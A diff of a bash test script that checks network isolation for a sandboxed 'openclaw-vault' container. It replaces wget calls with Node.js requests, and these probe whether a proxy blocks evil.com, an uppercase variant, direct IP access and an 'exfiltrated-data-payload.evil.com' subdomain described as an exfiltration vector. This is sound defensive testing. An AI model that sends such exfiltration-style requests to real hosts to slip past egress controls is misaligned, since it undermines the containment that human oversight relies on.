@@ -1,77 +1,100 @@
 #!/usr/bin/env bash
 # Test: Network isolation — vault container can only reach proxy, not internet directly
-set -euo pipefail
+#
+# All HTTP requests use Node.js http module (wget/curl are not in the image).
+# Proxy-routed requests are sent directly to vault-proxy:8080 in proxy-request
+# format (path = full URL, Host header = target domain) so mitmproxy intercepts.
+set -uo pipefail
 
 RUNTIME="${RUNTIME:-podman}"
 CONTAINER="openclaw-vault"
+PASS=0
+FAIL=0
+INFO=0
 
+check() {
+    local desc="$1" cmd="$2" expect_fail="${3:-false}"
+
+    printf "  %-55s " "$desc"
+
+    output=$($RUNTIME exec "$CONTAINER" sh -c "$cmd" 2>&1) && exit_code=0 || exit_code=$?
+
+    if [ "$expect_fail" = "true" ]; then
+        if [ $exit_code -ne 0 ]; then
+            echo "PASS (blocked as expected)"
+            PASS=$((PASS + 1))
+        else
+            echo "FAIL (should have been blocked)"
+            echo "       Output: $output"
+            FAIL=$((FAIL + 1))
+        fi
+    else
+        if [ $exit_code -eq 0 ]; then
+            echo "PASS"
+            PASS=$((PASS + 1))
+        else
+            echo "FAIL"
+            echo "       Output: $output"
+            FAIL=$((FAIL + 1))
+        fi
+    fi
+}
+
+echo ""
 echo "=== Network Isolation Tests ==="
+echo ""
+
+# Check container is running
+if ! $RUNTIME inspect "$CONTAINER" &>/dev/null; then
+    echo "[!] Container '$CONTAINER' is not running."
+    echo "    Start it first: $RUNTIME compose up -d"
+    exit 1
+fi
 
 # Test 1: Container can reach proxy
-echo -n "  Proxy reachable: "
-if $RUNTIME exec "$CONTAINER" sh -c "wget -q -O /dev/null --timeout=5 http://vault-proxy:8080 2>&1" &>/dev/null; then
-    echo "PASS"
-else
-    echo "PASS (proxy returns error page, but is reachable)"
-fi
+check "Proxy reachable" \
+    "node -e \"const h=require('http');const r=h.get({host:'vault-proxy',port:8080,timeout:5000},()=>{process.exit(0)});r.on('error',()=>process.exit(1));r.on('timeout',()=>{r.destroy();process.exit(1)})\""
 
-# Test 2: Blocked domain
-echo -n "  evil.com blocked: "
-if $RUNTIME exec "$CONTAINER" sh -c "wget -q -O /dev/null --timeout=5 http://evil.com 2>&1" &>/dev/null; then
-    echo "FAIL — should be blocked"
-    exit 1
-else
-    echo "PASS"
-fi
+# Test 2: Blocked domain returns 403 via proxy
+check "evil.com blocked by proxy (403)" \
+    "node -e \"const h=require('http');const r=h.get({host:'vault-proxy',port:8080,path:'http://evil.com/',headers:{Host:'evil.com'},timeout:5000},res=>{process.exit(res.statusCode===403?0:1)});r.on('error',()=>process.exit(1));r.on('timeout',()=>{r.destroy();process.exit(1)})\""
 
-# Test 3: Direct internet access bypassing proxy should fail
-echo -n "  Direct internet blocked (no gateway): "
-if $RUNTIME exec "$CONTAINER" sh -c "wget -q -O /dev/null --timeout=5 --no-proxy http://1.1.1.1 2>&1" &>/dev/null; then
-    echo "FAIL — direct internet access possible"
-    exit 1
-else
-    echo "PASS"
-fi
+# Test 3: Direct internet access bypassing proxy should fail (no default gateway)
+check "Direct internet blocked (no gateway)" \
+    "node -e \"const h=require('http');const r=h.get({host:'1.1.1.1',port:80,timeout:5000},()=>{process.exit(0)});r.on('error',()=>process.exit(1));r.on('timeout',()=>{r.destroy();process.exit(1)})\"" true
 
 # Test 4: IP-based request blocked via proxy (no domain allowlist bypass)
-echo -n "  IP-based request blocked via proxy: "
-if $RUNTIME exec "$CONTAINER" sh -c "wget -q -O /dev/null --timeout=5 http://1.1.1.1 2>&1" &>/dev/null; then
-    echo "FAIL — IP-based request succeeded (allowlist bypass)"
+check "IP-based request blocked via proxy" \
+    "node -e \"const h=require('http');const r=h.get({host:'vault-proxy',port:8080,path:'http://1.1.1.1/',headers:{Host:'1.1.1.1'},timeout:5000},res=>{process.exit(res.statusCode===403?0:1)});r.on('error',()=>process.exit(1));r.on('timeout',()=>{r.destroy();process.exit(1)})\""
+
+# Test 5: Case-insensitive blocking — EVIL.COM should also be blocked
+check "Case insensitive blocking (EVIL.COM)" \
+    "node -e \"const h=require('http');const r=h.get({host:'vault-proxy',port:8080,path:'http://EVIL.COM/',headers:{Host:'EVIL.COM'},timeout:5000},res=>{process.exit(res.statusCode===403?0:1)});r.on('error',()=>process.exit(1));r.on('timeout',()=>{r.destroy();process.exit(1)})\""
+
+# Test 6: Long subdomain blocked (data exfiltration vector)
+check "Long subdomain blocked (exfiltrated-data-payload.evil.com)" \
+    "node -e \"const h=require('http');const r=h.get({host:'vault-proxy',port:8080,path:'http://exfiltrated-data-payload.evil.com/',headers:{Host:'exfiltrated-data-payload.evil.com'},timeout:5000},res=>{process.exit(res.statusCode===403?0:1)});r.on('error',()=>process.exit(1));r.on('timeout',()=>{r.destroy();process.exit(1)})\""
+
+# Test 7: Subdomain edge case — evil.api.anthropic.com (informational only)
+printf "  %-55s " "Subdomain edge case (evil.api.anthropic.com)"
+output=$($RUNTIME exec "$CONTAINER" sh -c "node -e \"const h=require('http');const r=h.get({host:'vault-proxy',port:8080,path:'http://evil.api.anthropic.com/',headers:{Host:'evil.api.anthropic.com'},timeout:5000},res=>{process.exit(res.statusCode===403?1:0)});r.on('error',()=>process.exit(1));r.on('timeout',()=>{r.destroy();process.exit(1)})\"" 2>&1) && exit_code=0 || exit_code=$?
+if [ $exit_code -ne 0 ]; then
+    echo "INFO (blocked or unreachable — check subdomain matching policy)"
+    INFO=$((INFO + 1))
+else
+    echo "INFO (reachable — subdomain of allowed domain)"
+    INFO=$((INFO + 1))
+fi
+
+echo ""
+echo "====================================="
+echo "Results: $PASS passed, $FAIL failed, $INFO informational"
+echo ""
+
+if [ $FAIL -gt 0 ]; then
+    echo "[!] NETWORK ISOLATION TESTS FAILED"
+    echo "    $FAIL test(s) did not pass. Review output above."
     exit 1
 else
-    echo "PASS"
+    echo "[+] All network isolation tests passed."
 fi
-
-# Test 5: Subdomain allowlist edge case — random subdomain of allowed domain
-echo -n "  Subdomain edge case (evil.api.anthropic.com): "
-# This should resolve but be allowed since it's a subdomain of api.anthropic.com
-# The test validates that subdomain matching works correctly
-subdomain_result=$($RUNTIME exec "$CONTAINER" sh -c '
-    wget -q -O /dev/null --timeout=5 http://evil.api.anthropic.com 2>&1
-' 2>&1) && sub_exit=0 || sub_exit=$?
-# This is informational — the proxy should handle subdomain matching correctly
-if [ $sub_exit -ne 0 ]; then
-    echo "PASS (blocked or unreachable)"
-else
-    echo "INFO — subdomain was reachable (check if allowlist subdomain matching is intentional)"
-fi
-
-# Test 6: Case-sensitivity test — EVIL.COM should also be blocked
-echo -n "  Case insensitive blocking (EVIL.COM): "
-if $RUNTIME exec "$CONTAINER" sh -c "wget -q -O /dev/null --timeout=5 http://EVIL.COM 2>&1" &>/dev/null; then
-    echo "FAIL — uppercase domain bypassed allowlist"
-    exit 1
-else
-    echo "PASS"
-fi
-
-# Test 7: DNS exfiltration vector — encoded data in subdomain
-echo -n "  Long subdomain blocked (data exfil vector): "
-if $RUNTIME exec "$CONTAINER" sh -c "wget -q -O /dev/null --timeout=5 http://exfiltrated-data-payload.evil.com 2>&1" &>/dev/null; then
-    echo "FAIL — exfiltration subdomain reachable"
-    exit 1
-else
-    echo "PASS"
-fi
-
-echo "=== All network isolation tests passed ==="
